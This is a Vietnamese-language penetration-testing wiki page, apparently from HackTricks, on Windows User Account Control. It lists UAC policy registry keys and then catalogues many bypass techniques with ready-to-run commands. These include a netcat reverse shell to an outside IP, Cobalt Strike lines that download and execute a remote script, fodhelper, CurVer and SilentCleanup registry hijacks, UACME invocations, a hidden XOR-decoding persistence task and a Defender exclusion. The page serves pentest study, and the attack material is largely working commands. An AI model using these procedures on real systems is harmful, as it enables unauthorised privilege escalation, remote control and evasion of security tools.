# UAC - Kiểm soát Tài khoản Người dùng

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Kiểm soát Tài khoản Người dùng (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) là một tính năng hiển thị **lời nhắc xác nhận đối với các hoạt động cần quyền nâng cao**. Các ứng dụng có những mức `integrity` khác nhau, và một chương trình có **mức cao** có thể thực hiện các tác vụ **có khả năng làm tổn hại hệ thống**. Khi UAC được bật, các ứng dụng và tác vụ luôn **chạy trong ngữ cảnh bảo mật của một tài khoản không phải quản trị viên**, trừ khi quản trị viên cho phép rõ ràng các ứng dụng/tác vụ đó có quyền truy cập cấp quản trị viên vào hệ thống. Đây là một tính năng tiện lợi giúp bảo vệ quản trị viên khỏi những thay đổi ngoài ý muốn, nhưng không được xem là ranh giới bảo mật.<sup>[[2]](#references)</sup>

Để biết thêm thông tin về các mức integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Khi UAC được áp dụng, người dùng quản trị viên sẽ được cấp 2 token: một token người dùng tiêu chuẩn để thực hiện các thao tác thông thường ở mức integrity trung bình, và một token có quyền quản trị viên.

[Trang này](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) trình bày chi tiết cách UAC hoạt động, bao gồm quy trình đăng nhập, trải nghiệm người dùng và kiến trúc UAC.<sup>[[2]](#references)</sup> Quản trị viên có thể dùng các chính sách bảo mật để cấu hình cách UAC hoạt động cho tổ chức của họ ở cấp máy cục bộ (bằng secpol.msc), hoặc cấu hình rồi triển khai thông qua Group Policy Objects (GPO) trong môi trường miền Active Directory. Các cài đặt khác nhau được trình bày chi tiết [tại đây](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Có thể cấu hình 10 cài đặt Group Policy cho UAC. Bảng sau cung cấp thêm chi tiết:

| Cài đặt Group Policy                                                                                                                                                                                                                                                                                                                                                           | Khóa Registry                | Cài đặt mặc định                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kiểm soát Tài khoản Người dùng: Chế độ phê duyệt của quản trị viên cho tài khoản Administrator tích hợp sẵn](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Tắt)                                             |
| [Kiểm soát Tài khoản Người dùng: Cách xử lý lời nhắc nâng quyền đối với quản trị viên trong Chế độ phê duyệt của quản trị viên](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Yêu cầu xác nhận đối với các tệp nhị phân không phải Windows trên secure desktop) |
| [Kiểm soát Tài khoản Người dùng: Cách xử lý lời nhắc nâng quyền đối với người dùng tiêu chuẩn](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Yêu cầu thông tin xác thực trên secure desktop)         |
| [Kiểm soát Tài khoản Người dùng: Phát hiện việc cài đặt ứng dụng và yêu cầu nâng quyền](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Bật; mặc định tắt trên Enterprise)           |
| [Kiểm soát Tài khoản Người dùng: Chỉ nâng quyền cho các tệp thực thi đã ký và được xác thực](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Tắt)                                             |
| [Kiểm soát Tài khoản Người dùng: Chỉ nâng quyền cho các ứng dụng UIAccess được cài đặt ở vị trí an toàn](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Bật)                                              |
| [Kiểm soát Tài khoản Người dùng: Chạy tất cả quản trị viên trong Chế độ phê duyệt của quản trị viên](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Bật)                                              |
| [Kiểm soát Tài khoản Người dùng: Cho phép ứng dụng UIAccess yêu cầu nâng quyền mà không sử dụng secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Tắt)                                             |
| [Kiểm soát Tài khoản Người dùng: Chuyển sang secure desktop khi yêu cầu nâng quyền](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Bật)                                              |
| [Kiểm soát Tài khoản Người dùng: Ảo hóa các thao tác ghi tệp và registry thất bại sang vị trí riêng của từng người dùng](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Bật)                                              |

### Chính sách cài đặt phần mềm trên Windows

Theo mặc định, **các chính sách bảo mật cục bộ** ("secpol.msc" trên hầu hết các hệ thống) được cấu hình để **ngăn người dùng không phải quản trị viên cài đặt phần mềm**. Điều này có nghĩa là ngay cả khi người dùng không phải quản trị viên tải trình cài đặt phần mềm của bạn xuống, họ cũng không thể chạy trình cài đặt đó nếu không có tài khoản quản trị viên.

### Khóa Registry để buộc UAC yêu cầu nâng quyền

Là người dùng tiêu chuẩn không có quyền quản trị viên, bạn có thể đảm bảo tài khoản "tiêu chuẩn" **được UAC yêu cầu cung cấp thông tin xác thực** khi cố thực hiện một số hành động nhất định. Việc này cần sửa đổi một số **khóa registry**, đòi hỏi quyền quản trị viên, trừ khi có **UAC bypass** hoặc kẻ tấn công đã đăng nhập với tư cách quản trị viên.

Ngay cả khi người dùng thuộc nhóm **Administrators**, những thay đổi này vẫn buộc họ **nhập lại thông tin xác thực tài khoản** để thực hiện các thao tác quản trị.

**Trên thực tế, việc này chỉ hữu ích khi bạn đã có token được nâng quyền, UAC bypass hoặc cấu hình sai cho phép bạn thay đổi các khóa này; nếu không, thao tác ghi registry sẽ bị chặn.**

Các khóa và mục registry cần thay đổi như sau (giá trị mặc định nằm trong ngoặc đơn):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Bạn cũng có thể thực hiện việc này thủ công thông qua công cụ Local Security Policy. Sau khi thay đổi, các thao tác quản trị sẽ yêu cầu người dùng nhập lại thông tin xác thực.

### Lưu ý

**User Account Control không phải là ranh giới bảo mật.** Vì vậy, người dùng tiêu chuẩn không thể thoát khỏi tài khoản của mình và có được quyền quản trị viên nếu không có một khai thác local privilege escalation.

### Yêu cầu người dùng cấp 'toàn quyền truy cập máy tính'

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Đặc quyền UAC

- Internet Explorer Protected Mode sử dụng các kiểm tra integrity để ngăn các tiến trình có integrity level cao (như trình duyệt web) truy cập dữ liệu có integrity level thấp (như thư mục tệp Internet tạm thời). Việc này được thực hiện bằng cách chạy trình duyệt với token có integrity level thấp. Khi trình duyệt cố truy cập dữ liệu được lưu trong vùng có integrity level thấp, hệ điều hành sẽ kiểm tra integrity level của tiến trình và cho phép truy cập tương ứng. Tính năng này giúp ngăn các cuộc tấn công thực thi mã từ xa truy cập dữ liệu nhạy cảm trên hệ thống.
- Khi người dùng đăng nhập vào Windows, hệ thống tạo một access token chứa danh sách các đặc quyền của người dùng. Đặc quyền được định nghĩa là sự kết hợp giữa quyền và khả năng của người dùng. Token cũng chứa danh sách thông tin xác thực của người dùng, được dùng để xác thực người dùng với máy tính và các tài nguyên trên mạng.

### Autoadminlogon

Để cấu hình Windows tự động đăng nhập một người dùng cụ thể khi khởi động, hãy đặt **khóa registry `AutoAdminLogon`**. Tính năng này hữu ích trong môi trường kiosk hoặc để thử nghiệm. Chỉ sử dụng trên các hệ thống bảo mật, vì mật khẩu sẽ bị lộ trong registry.

Đặt các khóa sau bằng Registry Editor hoặc `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Để khôi phục hành vi đăng nhập thông thường, đặt `AutoAdminLogon` thành 0.

## Bypass UAC

> [!TIP]
> Lưu ý rằng nếu bạn có quyền truy cập đồ họa vào máy nạn nhân, bypass UAC rất đơn giản vì bạn chỉ cần nhấp vào "Yes" khi lời nhắc UAC xuất hiện.

Bypass UAC cần thiết trong tình huống sau: **UAC đang được bật, tiến trình của bạn chạy trong ngữ cảnh medium integrity và người dùng của bạn thuộc nhóm administrators**.

Điều quan trọng cần lưu ý là **bypass UAC khó hơn nhiều nếu UAC đang ở mức bảo mật cao nhất (Always) so với các mức khác (Default).**

### Phân loại nhanh từ shell có medium integrity

Trước khi thử bypass, hãy xác nhận bạn đang ở đúng tình huống và xác định bản build của máy để chọn các phương pháp đã biết là hoạt động:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Ghi chú thực tế:
- Nếu `EnableLUA=0`, bạn không cần bypass: bất kỳ admin token nào cũng có thể yêu cầu high integrity trực tiếp.
- `ConsentPromptBehaviorAdmin=2` hoặc `5` là trường hợp phổ biến đối với các bypass dựa trên auto-elevate / COM.
- `Always Notify` làm tăng mức độ khó, nhưng bạn vẫn nên kiểm tra chính xác build thay vì cho rằng sẽ thất bại: UACME vẫn theo dõi một số phương thức `AlwaysNotify compatible` trên các build Windows hiện đại.<sup>[[3]](#references)</sup>

### UAC bị tắt

Nếu UAC đã bị tắt (`ConsentPromptBehaviorAdmin` là **`0`**), bạn có thể **thực thi reverse shell với quyền admin** (mức độ toàn vẹn cao) bằng cách dùng lệnh như sau:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass bằng token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + debug object có thể tái sử dụng

Giao diện local RPC của AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` có thể tạo process với tính năng debugging được bật. Các process được tạo bằng debugging trên cùng một thread sẽ dùng chung debug object của thread; sự kiện debug khi tạo process chứa handle process có toàn quyền, ngay cả khi kết quả RPC chỉ cấp quyền truy cập hạn chế. Điều này biến việc tái sử dụng debug object thành một primitive UAC dành cho thành viên nhóm Administrators có mức toàn vẹn trung bình.<sup>[[11]](#references)[[12]](#references)</sup>

Một chuỗi khai thác thực tế gồm:<sup>[[11]](#references)[[12]](#references)</sup>

1. Gọi phương thức local RPC (trực tiếp hoặc thông qua `NdrAsyncClientCall`) để tạo một process hy sinh không được nâng quyền, với debugging được bật.
2. Truy vấn `ProcessDebugObjectHandle` bằng `NtQueryInformationProcess`, tách object bằng `NtRemoveProcessDebug`, giữ lại object và kết thúc process hy sinh.
3. Dùng cùng giao diện RPC để tạo một process auto-elevated đáng tin cậy, rồi gắn object đã lưu với thread đang gọi thông qua `DbgUiSetThreadDebugObject`.
4. Gọi `WaitForDebugEvent` và lấy handle process từ `CREATE_PROCESS_DEBUG_EVENT`; sao chép handle đó bằng `NtDuplicateObject` trước khi tiếp tục.
5. Cung cấp handle đã sao chép cho `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` và khởi chạy payload bằng cấu trúc startup-info mở rộng. Cách này vừa tái sử dụng ngữ cảnh process đã được nâng quyền, vừa khiến process con có quan hệ parent trông đáng tin cậy.

Hãy tìm chuỗi thao tác ngắn này thay vì chỉ tìm binary auto-elevated: tạo process qua local AppInfo RPC, truy vấn `ProcessDebugObjectHandle`, detach/reattach debugger, ngay lập tức có sự kiện debug khi tạo process, sao chép handle và process con có parent được ghi nhận không trùng với process đã gọi các API tạo process.<sup>[[12]](#references)</sup>

### **Rất** cơ bản: UAC "bypass" (toàn quyền truy cập hệ thống tệp)

Nếu bạn có shell với một user thuộc nhóm Administrators, bạn có thể **mount share C$** qua SMB (hệ thống tệp) thành một ổ đĩa mới trên máy cục bộ, và bạn sẽ **truy cập được mọi thứ trong hệ thống tệp** (kể cả thư mục home của Administrator).

> [!WARNING]
> **Có vẻ như thủ thuật này không còn hoạt động**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC bypass với Cobalt Strike

Các kỹ thuật của Cobalt Strike chỉ hoạt động nếu UAC không được đặt ở mức bảo mật tối đa

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** và **Metasploit** cũng có một số module để **bypass** **UAC**.

### Các giao diện COM được nâng quyền tự động (`ICMLuaUtil` / `CMSTPLUA`)

Các đối tượng COM được nâng quyền tự động vẫn là một bề mặt UAC thực tiễn trên các bản build hiện đại. UACME vẫn ghi nhận `ICMLuaUtil` hoạt động trên các nhánh Windows hiện tại, còn các công cụ tấn công tiếp tục điều chỉnh `CMSTPLUA` bằng cách kết hợp một tiến trình desktop tương tác, thực thi 64-bit và đôi khi giả mạo PEB/tiến trình trước khi gọi COM Elevation Moniker.<sup>[[3]](#references)</sup>

Mẹo thực tiễn:
- Ưu tiên tiến trình **64-bit** trong **phiên tương tác** của người dùng (thường là `explorer.exe` hoặc tiến trình con của nó).
- Nếu shell thô không hoạt động, hãy thử lại bằng triển khai BOF / UACME thay vì một wrapper `CreateProcess` đơn giản.
- Dự kiến tiến trình con sẽ chạy trong một **tiến trình được nâng quyền riêng biệt**; nhiều BOF không nâng quyền beacon hiện tại ngay tại chỗ.

### KRBUACBypass

Tài liệu và công cụ tại [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Các khai thác bypass UAC

[**UACME**](https://github.com/hfiref0x/UACME) là tập hợp các kỹ thuật bypass UAC. Hãy biên dịch bằng Visual Studio hoặc MSBuild; quá trình build tạo ra một số tệp thực thi (ví dụ: `Source\Akagi\output\x64\Debug\Akagi.exe`), vì vậy hãy chọn phương pháp phù hợp với bản build mục tiêu.<sup>[[3]](#references)</sup>\
Hãy cẩn thận: một số phương pháp bypass khởi chạy chương trình hoặc lời nhắc hiển thị có thể khiến người dùng cảnh giác.<sup>[[3]](#references)</sup>

UACME có **phiên bản build mà từ đó từng kỹ thuật bắt đầu hoạt động**.<sup>[[3]](#references)</sup> Bạn có thể tìm kiếm kỹ thuật ảnh hưởng đến các phiên bản của mình:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Ngoài ra, sử dụng trang [này](https://en.wikipedia.org/wiki/Windows_10_version_history), bạn có thể xác định bản phát hành Windows `1607` từ các phiên bản build.

Quy trình thực tế là trước tiên **đánh giá build của host**, sau đó mới chạy phương pháp phù hợp:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` nhanh chóng đối chiếu build cục bộ với các phương thức UAC đã biết, rất hữu ích để nhanh chóng loại bỏ các PoC không còn hoạt động.<sup>[[4]](#references)</sup>
- `UACME` vẫn là danh mục công khai tốt nhất để xác định chính xác build tương ứng với một bypass. Phiên bản 3.7.1 bổ sung các phương thức 83–85, trong khi bản phát hành trước đó kiểm thử lại các phương thức hiện có trên **Windows 11 25H2**; hãy kiểm tra lại bảng phương thức và ghi chú phát hành thay vì cho rằng một PoC cũ vẫn áp dụng nguyên trạng.<sup>[[3]](#references)[[9]](#references)</sup>

### Chuỗi WNF/UIAccess tương thích với Always Notify (UACME 3.7.1)

`Always Notify` không loại bỏ mọi UAC bypass. UACME 3.7.1 triển khai ba phương thức x64 mới, kết hợp trạng thái môi trường/giao thức do người dùng kiểm soát với hành vi của scheduled task hoặc UIAccess chạy với quyền cao, đồng thời đánh dấu cả ba là `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** chuyển hướng `SystemRoot` để `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` được kích hoạt bởi WNF khiến `taskhostw.exe` chạy với quyền cao side-load `unifiedconsent.dll`. UACME theo dõi phương thức này từ Windows 10 build 19041.
- **84 — TabTip:** dùng cùng primitive biến môi trường với UIAccess `TabTip.exe`, chương trình này tải `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` hoặc `rsaenh.dll` tùy theo build, sau đó pivot từ ngữ cảnh UIAccess có integrity cao thu được. UACME theo dõi phương thức này từ Windows 8.1 / Server 2016.
- **85 — Narrator:** chiếm quyền giao thức `feedback-hub` của từng người dùng, điều khiển Narrator bằng `Alt+CapsLock+F`, rồi khởi chạy một bản sao `osk.exe` có thể ghi, bản sao này side-load `OskSupport.dll`. Phương thức này yêu cầu desktop tương tác và được theo dõi từ Windows 10 1809 / Server 2019.

Sau khi build các đơn vị payload và Akagi theo tài liệu của UACME, hãy gọi số phương thức tương ứng (lệnh tùy chọn mặc định là `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Phương pháp 84 và 85 phụ thuộc vào UIAccess/tương tác với desktop, vì vậy đừng mong chúng hoạt động nguyên trạng từ Session 0 hoặc shell dịch vụ không tương tác. Cả ba phương pháp đều thao tác với trạng thái môi trường/giao thức và đưa các DLL vào vị trí; hãy kiểm tra phần triển khai và xóa các tạo tác đó sau khi thử nghiệm.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (chiếm quyền registry)

Binary đáng tin cậy `fodhelper.exe` được tự động nâng quyền trên các phiên bản Windows hiện đại. Khi được khởi chạy, nó truy vấn đường dẫn registry theo người dùng bên dưới mà không xác thực verb `DelegateExecute`. Đặt một lệnh tại đó cho phép tiến trình Medium Integrity (người dùng thuộc nhóm Administrators) tạo tiến trình High Integrity mà không hiện lời nhắc UAC.

Đường dẫn registry được fodhelper truy vấn:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Các bước PowerShell (thiết lập payload, sau đó kích hoạt)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Ghi chú:
- Hoạt động khi người dùng hiện tại là thành viên của Administrators và cấp độ UAC là mặc định/nới lỏng (không phải Always Notify với các hạn chế bổ sung).
- Dùng đường dẫn `sysnative` để khởi chạy PowerShell 64-bit từ tiến trình 32-bit trên Windows 64-bit.
- Payload có thể là bất kỳ lệnh nào (PowerShell, cmd hoặc đường dẫn EXE). Tránh giao diện nhắc xác nhận để tăng tính ẩn mình.

#### Trigger `ComputerDefaults.exe` cho cùng handler `ms-settings`

`ComputerDefaults.exe` phân giải cùng liên kết `ms-settings\Shell\Open\command` theo từng người dùng như `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Sau khi đặt lệnh mặc định và giá trị `DelegateExecute` rỗng ở trên, dùng `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` làm trigger thay thế; không lặp lại bước thiết lập registry.<sup>[[13]](#references)[[14]](#references)</sup> Các điều kiện tiên quyết về quản trị viên có mức toàn vẹn trung bình và chính sách UAC trong ghi chú `fodhelper.exe` ở trên vẫn áp dụng.<sup>[[2]](#references)[[3]](#references)</sup> UACME liệt kê trigger này kể từ Windows 10 RS4 (build 17134), vì vậy hãy xác minh trên build mục tiêu.<sup>[[3]](#references)</sup>

#### Biến thể CurVer/extension hijack (chỉ HKCU)

Các mẫu gần đây lạm dụng `fodhelper.exe` tránh dùng `DelegateExecute`, thay vào đó **chuyển hướng ProgID `ms-settings`** thông qua giá trị `CurVer` theo từng người dùng. Binary tự động nâng quyền vẫn phân giải handler trong `HKCU`, vì vậy không cần token quản trị để tạo các khóa:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Sau khi nâng quyền, malware thường **vô hiệu hóa các lời nhắc trong tương lai** bằng cách đặt `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` thành `0`, rồi thực hiện thêm các hành vi né tránh phòng thủ (ví dụ: `Add-MpPreference -ExclusionPath C:\ProgramData`) và tạo lại cơ chế persistence để chạy với mức toàn vẹn cao. Một tác vụ persistence điển hình lưu **PowerShell script được mã hóa XOR** trên đĩa, rồi giải mã và thực thi trong bộ nhớ mỗi giờ:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Biến thể này vẫn dọn dropper và chỉ để lại các payload đã staging, khiến việc phát hiện phụ thuộc vào giám sát **`CurVer` hijack**, hành vi can thiệp vào `ConsentPromptBehaviorAdmin`, việc tạo exclusion trong Defender hoặc các scheduled task giải mã PowerShell trong bộ nhớ.<sup>[[5]](#references)</sup>

### Bypass UAC qua task `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` khởi chạy `cleanmgr.exe` với quyền cao nhất và mở rộng `%windir%` từ môi trường của người dùng. Nếu kiểm soát được `HKCU\Environment\windir`, bạn có thể chuyển hướng phần mở rộng đó đến một lệnh tùy ý và đạt được integrity cao mà không cần hộp thoại consent.<sup>[[8]](#references)</sup> Phương pháp này vẫn đáng để kiểm thử trên các bản dựng gần đây vì UACME vẫn duy trì kỹ thuật này, và việc theo dõi vấn đề gần đây cho thấy Windows 11 24H2 có thể chỉ cần điều chỉnh nhỏ về dấu ngoặc kép.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Nếu tác vụ trích dẫn đường dẫn trên bản build đó, hãy thử lại với payload kết thúc bằng dấu ngoặc kép (ví dụ: `cmd.exe"`). Luôn dọn dẹp `HKCU\Environment\windir` sau khi kiểm tra.

#### Thêm UAC bypass

Nhiều UAC bypass kinh điển khai thác luồng giao diện người dùng, đối tượng COM hoặc tương tác với desktop yêu cầu **phiên tương tác đầy đủ** với nạn nhân; một shell `nc.exe` thông thường hoặc dịch vụ chạy trong **Session 0** thường là chưa đủ.

Bạn thường có thể giải quyết vấn đề này bằng một phiên **meterpreter**. Migrate sang một **process** có giá trị **Session** bằng **1**:

![Trỏ ms-settings đến một extension tùy chỉnh (.thm) và ánh xạ extension đó đến payload của chúng ta - Thêm UAC bypass: Bạn có thể làm điều này bằng một phiên meterpreter. Migrate sang một process có Session...](<../../images/image (863).png>)

(_explorer.exe_ sẽ hoạt động)

### UAC Bypass bằng GUI

Nếu có quyền truy cập vào **GUI**, bạn chỉ cần chấp nhận lời nhắc UAC khi nó xuất hiện; thực ra bạn không cần bypass về mặt kỹ thuật. Vì vậy, có được một phiên GUI thường là đủ để vượt qua trở ngại thực tế do UAC tạo ra.

Ngoài ra, nếu bạn có được phiên GUI mà ai đó đang sử dụng (có thể thông qua RDP), sẽ có **một số công cụ đang chạy với quyền administrator** mà từ đó bạn có thể **chạy** một **cmd**, chẳng hạn, **trực tiếp với quyền admin** mà không bị UAC nhắc lại, như [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cách này có thể **stealthy** hơn một chút.

### UAC bypass brute-force gây nhiều tiếng ồn

Nếu có thể chấp nhận gây tiếng ồn, một công cụ như [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) có thể liên tục yêu cầu nâng quyền cho đến khi người dùng chấp nhận.

### Tự tạo bypass - Phương pháp cơ bản để UAC bypass

Nếu xem **UACME**, bạn sẽ thấy rằng **nhiều UAC bypass khai thác DLL hijacking** (thường bằng cách khiến một binary được nâng quyền tải DLL do attacker kiểm soát từ một đường dẫn có quyền ghi). [Đọc nội dung này để tìm hiểu cách phát hiện lỗ hổng DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tìm một binary có thể **autoelevate** (kiểm tra xem khi được thực thi, nó có chạy ở mức integrity cao hay không).
2. Dùng procmon tìm các sự kiện "**NAME NOT FOUND**" có thể bị khai thác bằng **DLL Hijacking**.
3. Có thể bạn sẽ cần **ghi** DLL vào một số **đường dẫn được bảo vệ** (như C:\Windows\System32), nơi bạn không có quyền ghi. Bạn có thể bypass điều này bằng cách dùng:
   1. **wusa.exe**: Windows 7, 8 và 8.1. Công cụ này cho phép giải nén nội dung của tệp CAB vào các đường dẫn được bảo vệ (vì công cụ chạy ở mức integrity cao).
   2. **IFileOperation**: Windows 10.
4. Chuẩn bị một **script** để sao chép DLL vào đường dẫn được bảo vệ, sau đó thực thi binary dễ bị tấn công và có thể autoelevate.

